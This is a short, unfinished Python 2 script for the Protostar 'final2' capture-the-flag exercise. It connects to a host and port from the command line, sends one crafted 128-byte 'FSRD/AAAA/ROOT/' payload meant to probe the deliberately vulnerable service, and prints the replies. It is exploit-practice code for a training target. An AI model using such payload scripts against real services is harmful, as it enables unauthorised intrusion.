"""
This code is for protostar final2 challange.
Not complete yet.
"""
import socket
import sys
import re
import struct

try:
 #create an AF_INET, STREAM socket (TCP)
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(10)
except socket.error, msg:
    print 'Failed to create socket. Error code: ' + str(msg[0]) + ' , Error message : ' + msg[1]
    sys.exit()

print 'Socket Created'

host = sys.argv[1]
port = sys.argv[2]

try:
    remote_ip = socket.gethostbyname( host )

except socket.gaierror:
 #could not resolve
    print 'Hostname could not be resolved. Exiting'
    sys.exit()

print 'Ip address of ' + host + ' is ' + remote_ip

#Connect to remote server
s.connect((remote_ip, int(port)))

print 'Socket Connected to ' + host + ' on ip ' + remote_ip
list_of_commands = []
try:
    required_size = 128
    command = "FSRD/AAAA/ROOT/AAAA/"
    command += "."*(required_size-len(command)-1)+"\x0a"
    list_of_commands.append(command)

    for cmd in list_of_commands:
        print "Payloads size %s" % len(cmd)
        print cmd
        s.sendall(cmd)
        s.sendall("\n")

    while True:
        recv = s.recv(1024)
        if len(recv) == 0:
            break
        print recv
    s.close()

except socket.error, e:
 #Send failed
    print 'Send failed. %s' % e
    sys.exit()

print 'Done.'
